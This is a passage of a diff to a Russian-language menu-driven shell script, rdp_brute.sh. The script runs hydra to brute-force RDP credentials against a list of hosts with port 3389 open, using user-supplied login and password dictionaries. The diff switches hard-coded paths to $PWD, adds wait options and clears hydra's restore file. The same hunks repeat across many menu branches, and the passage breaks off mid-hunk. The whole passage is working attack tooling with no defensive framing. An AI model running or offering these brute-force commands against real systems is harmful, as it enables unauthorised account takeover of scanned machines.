 ./rdp_brute.sh
@@ -7740,7 +8164,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7750,7 +8174,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7759,7 +8183,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7788,6 +8212,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7799,7 +8227,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7809,7 +8237,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7819,7 +8247,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7828,7 +8256,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7857,6 +8285,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7868,7 +8300,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7878,7 +8310,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7888,7 +8320,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7897,7 +8329,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7926,6 +8358,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -7937,7 +8373,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7947,7 +8383,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7957,7 +8393,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7966,7 +8402,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -7994,6 +8430,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8005,7 +8445,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8015,7 +8455,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8025,7 +8465,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8034,7 +8474,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8063,6 +8503,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8074,7 +8518,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8084,7 +8528,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8094,7 +8538,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8103,7 +8547,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8132,6 +8576,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8143,7 +8591,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8153,7 +8601,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8163,7 +8611,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8172,7 +8620,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8201,6 +8649,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8212,7 +8664,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8222,7 +8674,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8232,7 +8684,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8241,7 +8693,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8270,6 +8722,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8281,7 +8737,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8291,7 +8747,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8301,7 +8757,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8310,7 +8766,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8339,6 +8795,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8350,7 +8810,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8360,7 +8820,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8370,7 +8830,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8379,7 +8839,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8408,6 +8868,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8419,7 +8883,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8429,7 +8893,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8439,7 +8903,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8448,7 +8912,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8476,6 +8940,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8487,7 +8955,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8497,7 +8965,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8507,7 +8975,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8516,7 +8984,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8545,6 +9013,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -8556,7 +9028,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -8566,7 +9038,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
